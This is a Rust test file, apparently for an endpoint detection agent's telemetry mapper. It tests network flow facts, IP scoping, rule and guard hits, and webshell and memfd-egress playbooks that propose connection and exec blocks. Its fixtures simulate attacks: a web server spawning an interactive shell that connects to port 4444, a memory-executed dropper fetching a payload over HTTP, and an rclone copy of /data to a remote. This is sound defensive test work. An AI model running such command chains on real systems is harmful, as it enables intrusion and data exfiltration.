    assert_eq!(tx[0].fields["bytes"], "5000");
    assert_eq!(tx[0].fields["dst_ip"], "203.0.113.9");
    // The same address again is not new, and a send from a pid with no connect has no
    // destination.
    let again = map_one(&mut m, net_out("network::connect", 71, &[("dst_addr", "203.0.113.9"), ("dst_port", "443")]));
    assert_eq!(again[0].fields["dst_new"], "false");
    let lone = map_one(&mut m, net_out("network::tx_bytes", 72, &[("bytes", "1")]));
    assert!(!lone[0].fields.contains_key("dst_ip"));
    // recv byte counts are not facts.
    assert!(map_one(&mut m, net_out("network::rx_bytes", 70, &[("bytes", "9")])).is_empty());
}

#[test]
fn a_tls_hello_names_the_server_and_its_later_sends() {
    let mut m = mapper();
    map_one(&mut m, net_out("network::connect", 75, &[("dst_addr", "203.0.113.12"), ("dst_port", "443"), ("family", "2")]));
    let h = map_one(
        &mut m,
        net_out("network::tls_client_hello", 75, &[("dst_addr", "203.0.113.12"), ("dst_port", "443"), ("sni", "bucket-x.s3.amazonaws.com"), ("alpn", "h2")]),
    );
    assert_eq!(h[0].kind, FactKind::NetFlow);
    assert_eq!(h[0].fields["op"], "tls_hello");
    assert_eq!(h[0].fields["sni"], "bucket-x.s3.amazonaws.com");
    assert_eq!(h[0].fields["alpn"], "h2");
    assert_eq!(h[0].fields["dst_scope"], "public");
    let tx = map_one(&mut m, net_out("network::tx_bytes", 75, &[("bytes", "4096")]));
    assert_eq!(tx[0].fields["sni"], "bucket-x.s3.amazonaws.com");
    // A new connect starts without a name until its own hello.
    map_one(&mut m, net_out("network::connect", 75, &[("dst_addr", "203.0.113.10"), ("dst_port", "443")]));
    let tx = map_one(&mut m, net_out("network::tx_bytes", 75, &[("bytes", "1")]));
    assert!(!tx[0].fields.contains_key("sni"));
}

#[test]
fn ip_scopes() {
    for (ip, want) in [
        ("127.0.0.1", "loopback"),
        ("10.1.2.3", "private"),
        ("172.20.0.1", "private"),
        ("192.168.1.1", "private"),
        ("100.64.0.1", "private"),
        ("169.254.1.1", "link_local"),
        ("8.8.8.8", "public"),
        ("203.0.113.10", "public"),
        ("::1", "loopback"),
        ("fd00::1", "private"),
        ("fe80::1", "link_local"),
        ("2001:db8::1", "public"),
        ("::ffff:10.0.0.1", "private"),
        ("nonsense", "unknown"),
    ] {
        assert_eq!(ip_scope(ip), want, "{ip}");
    }
}

#[test]
fn tcp_flows_are_attributed_timed_and_swept() {
    let s = Sim::new();
    let mut m = Mapper::with_mounts(Box::new(FixedMounts(vec![])));
    let read = |_pid: i64| ProcInfo::default();
    let frames = |s: &Sim, tgid: i64, old: u32, new: u32, l: (&str, u16)| {
        let mut data = vec![
            ("ts_ns", s.ts_ns()),
            ("tgid", tgid.to_string()),
            ("evt_type", "200".to_string()),
            ("syscall_id", "0".to_string()),
            ("aux_u32", ((old << 16) | new).to_string()),
            ("fam", "2".to_string()),
            ("laddr4", l.0.to_string()),
            ("raddr4", "203.0.113.10".to_string()),
            ("rport", "443".to_string()),
        ];
        if l.1 != 0 {
            data.push(("lport", l.1.to_string()));
        }
        out("network", "tcp_state", &data)
    };
    let facts = |m: &mut Mapper, o: TelemetryOutput, t: u64| -> Vec<Fact> {
        adapter_facts_with(&o, t, &read).iter().flat_map(|af| m.facts(af)).collect()
    };
    let t0 = s.t;
    // SYN_SENT runs in the connecting process (pid 500) and gives no fact by itself.
    assert!(facts(&mut m, frames(&s, 500, 7, 2, ("10.0.2.15", 0)), t0).is_empty());
    let est = facts(&mut m, frames(&s, 99, 2, 1, ("10.0.2.15", 41000)), t0);
    assert_eq!(est.len(), 1);
    assert_eq!(est[0].kind, FactKind::Net);
    assert_eq!(est[0].fields["op"], "established");
    assert_eq!(est[0].fields["direction"], "outbound");
    // The pid is the one that sent the SYN, not the task the SYN-ACK arrived in.
    assert_eq!(est[0].fields["pid"], "500");
    assert_eq!(est[0].fields["src_port"], "41000");
    assert_eq!(est[0].fields["dst_private"], "false");
    // Swept at 59 s: nothing. At 60 s: one open_flow. At 90 s: none again until 120 s.
    assert!(m.sweep_flows(t0 + 59, "h").is_empty());
    let open = m.sweep_flows(t0 + 60, "h");
    assert_eq!(open.len(), 1);
    assert_eq!(open[0].fields["op"], "open_flow");
    assert_eq!(open[0].fields["duration_sec"], "60");
    assert!(m.sweep_flows(t0 + 90, "h").is_empty());
    assert_eq!(m.sweep_flows(t0 + 120, "h").len(), 1);
    // CLOSE ends the flow with its duration.
    let mut later = Sim::new();
    later.t = t0 + 125;
    let closed = facts(&mut m, frames(&later, 0, 1, 7, ("10.0.2.15", 41000)), t0 + 125);
    assert_eq!(closed[0].fields["op"], "closed");
    assert_eq!(closed[0].fields["duration_sec"], "125");
    assert!(m.sweep_flows(t0 + 200, "h").is_empty());
}

#[test]
fn guard_rule_perf_and_auth_records_become_facts() {
    let mut m = mapper();
    let g = map_one(
        &mut m,
        out(
            "process",
            "guard::self_protect::blocked",
            &[
                ("source", "edr_guard".into()),
                ("pid", "33".into()),
                ("binary_path", "/usr/bin/kill".into()),
                ("guard", "self_protect".into()),
                ("action", "blocked".into()),
                ("target", "pid 7".into()),
                ("mitre", "T1562.001".into()),
            ],
        ),
    );
    assert_eq!(g[0].kind, FactKind::RuleHit);
    assert_eq!(g[0].fields["rule_id"], "guard:self_protect");
    assert_eq!(g[0].fields["ttp"], "T1562.001");
    assert_eq!(g[0].fields["source"], "guard");
    assert_eq!(g[0].exe.as_deref(), Some("/usr/bin/kill"));
    let r = map_one(
        &mut m,
        out(
            "rules",
            "rules::hit",
            &[
                ("source", "rule_engine".into()),
                ("rule_id", "proc_shell_curlpipe".into()),
                ("ttps", "T1059,T1105".into()),
                ("exe", "/usr/bin/bash".into()),
            ],
        ),
    );
    assert_eq!((r[0].fields["ttp"].as_str(), r[0].fields["source"].as_str()), ("T1059", "rules"));
    let p = map_one(
        &mut m,
        out("perf", "host_perf::sample", &[("source", "host_perf".into()), ("scope", "process".into()), ("pid", "9".into()), ("cpu_pct", "99.0".into())]),
    );
    assert_eq!((p[0].kind, p[0].fields["cpu_pct"].as_str()), (FactKind::HostPerf, "99.0"));
    let a = map_one(
        &mut m,
        out("auth", "auth::ssh_login", &[("source", "auth_log".into()), ("result", "success".into()), ("user", "alice".into()), ("src_ip", "203.0.113.7".into())]),
    );
    assert_eq!(a[0].kind, FactKind::Auth);
    assert_eq!(a[0].user.as_deref(), Some("alice"));
    assert_eq!(a[0].fields["src_ip"], "203.0.113.7");
}

#[test]
fn exec_facts_carry_parent_cwd_and_exe_name() {
    let mut s = Sim::new();
    s.exec(800, 1, 33, "/usr/sbin/nginx", "nginx: worker");
    s.exec(801, 800, 33, "/usr/bin/bash", "bash -i");
    let af = adapter_facts_with(
        &out("process", "process::exec", &[("pid", "802".into()), ("ppid", "801".into()), ("source", "proc_lifecycle".into())]),
        s.t,
        &|_| ProcInfo { exe: Some("/usr/bin/id".into()), cmdline: Some("id".into()), cwd: Some("/var/www".into()), env: Vec::new() },
    );
    let f = s.mapper.facts(&af[0]);
    assert_eq!(f[0].fields["exe_name"], "id");
    assert_eq!(f[0].fields["cwd"], "/var/www");
    assert_eq!(f[0].fields["parent_exe"], "/usr/bin/bash");
    assert_eq!(f[0].fields["parent_name"], "bash");
}

#[test]
fn frames_without_a_uid_take_the_user_of_the_exec() {
    let mut s = Sim::new();
    s.exec(820, 1, 1000, "/usr/bin/rclone", "rclone copy /data remote:b");
    let net = |pid: &str, uid: Option<&str>| {
        let mut d = vec![("pid", pid.to_string()), ("source", "net_flow".to_string()), ("bytes", "10".to_string())];
        if let Some(u) = uid {
            d.push(("uid", u.to_string()));
        }
        out("network", "network::tx_bytes", &d)
    };
    let facts = |s: &mut Sim, o: TelemetryOutput| {
        let af = adapter_facts_with(&o, s.t, &|_| ProcInfo::default());
        s.mapper.facts(&af[0])
    };
    // An old frame with no uid: the user from the exec frame.
    assert_eq!(facts(&mut s, net("820", None))[0].user.as_deref(), Some("uid:1000"));
    // net_flow frames carry their own uid now, and it wins.
    assert_eq!(facts(&mut s, net("820", Some("0")))[0].user.as_deref(), Some("root"));
    // A process the agent never saw exec has no user.
    assert_eq!(facts(&mut s, net("821", None))[0].user, None);
}

#[test]
fn the_queue_filter_keeps_only_what_the_mapper_uses() {
    let d = |kv: &[(&str, &str)]| -> HashMap<String, String> {
        kv.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
    };
    assert!(mapper_wants("process", "process::exec", &d(&[("source", "proc_lifecycle")])));
    assert!(!mapper_wants("process", "process::fork", &d(&[("source", "proc_lifecycle")])));
    assert!(!mapper_wants("process", "process::exit", &d(&[("source", "proc_lifecycle")])));
    assert!(!mapper_wants("memory", "memory::w_then_x", &d(&[("source", "wx_exec")])));
    assert!(mapper_wants("network", "network::tx_bytes", &d(&[("source", "net_flow")])));
    assert!(!mapper_wants("network", "network::rx_bytes", &d(&[("source", "net_flow")])));
    assert!(mapper_wants("file", "fd_close", &d(&[("syscall_id", "57")])));
    assert!(!mapper_wants("process", "ebpf_unknown_frame", &d(&[("wire_len", "12")])));
    assert!(mapper_wants("process", "guard::memfd_exec::blocked", &d(&[("source", "edr_guard")])));
}

// ---- Shield proposals from the shipped playbooks ----

#[test]
fn the_shipped_webshell_playbook_proposes_connect_deny_of_the_shells_destination() {
    let mut s = Sim::new();
    webshell(&mut s);
    let hit = s.hits.iter().find(|h| h.playbook_id == WEBSHELL).expect("fired");
    assert_eq!(hit.shield_templates.len(), 1);
    let props = crate::shield::propose::from_hit(hit, "inc-ws", 1_800_000_000, Path::new("/nonexistent"), Path::new("/nonexistent"));
    assert_eq!(props.len(), 1);
    let doc = &props[0].doc;
    assert_eq!(doc.kind, crate::shield::ShieldKind::ConnectDeny);
    assert_eq!(doc.target.cidr.as_deref(), Some("203.0.113.10"));
    assert_eq!(doc.target.port, Some(4444));
    assert_eq!(doc.expires_at - doc.not_before, 3600);
    // The shell is not in this test's /proc, so the scope falls back to the host and says so.
    assert!(doc.scope.cgroup.is_none());
    assert!(props[0].notes[0].contains("web_to_shell_exec"));
}

#[test]
fn the_shipped_memfd_egress_playbook_proposes_exec_deny_only_for_a_dropped_file() {
    // A packaged curl as the child: the playbook fires, the path regex keeps the proposal back.
    let mut s = Sim::new();
    memfd_egress(&mut s);
    let hit = s.hits.iter().find(|h| h.playbook_id == MEMFD_EGRESS).expect("fired");
    assert_eq!(hit.shield_templates[0].kind, "exec_deny");
    let none = crate::shield::propose::from_hit(hit, "i", 1, Path::new("/proc"), Path::new("/sys/fs/cgroup"));
    assert!(none.is_empty());
    // The same chain with a child dropped in /tmp. The file must exist, because the
    // proposal names it by device and inode.
    let payload = format!("/tmp/edr_shield_payload_{}", std::process::id());
    std::fs::write(&payload, b"#!/bin/sh\n").unwrap();
    let mut s = Sim::new();
    s.memfd_exec(9900, "/memfd:x (deleted)", "x");
    s.advance(2);
    s.exec(9901, 9900, 0, &payload, &format!("{payload} http://203.0.113.10/"));
    s.advance(1);
    s.connect(9901, "203.0.113.10", 80);
    let hit = s.hits.iter().find(|h| h.playbook_id == MEMFD_EGRESS).expect("fired with the dropped child");
    let props = crate::shield::propose::from_hit(hit, "inc-m", 1_800_000_000, Path::new("/proc"), Path::new("/sys/fs/cgroup"));
    assert_eq!(props.len(), 1, "{:?}", hit.slots);
    let meta = std::fs::metadata(&payload).unwrap();
    use std::os::unix::fs::MetadataExt;
    assert_eq!(props[0].doc.target.ino, Some(meta.ino()));
    assert_eq!(props[0].doc.kind, crate::shield::ShieldKind::ExecDeny);
    let _ = std::fs::remove_file(&payload);
}
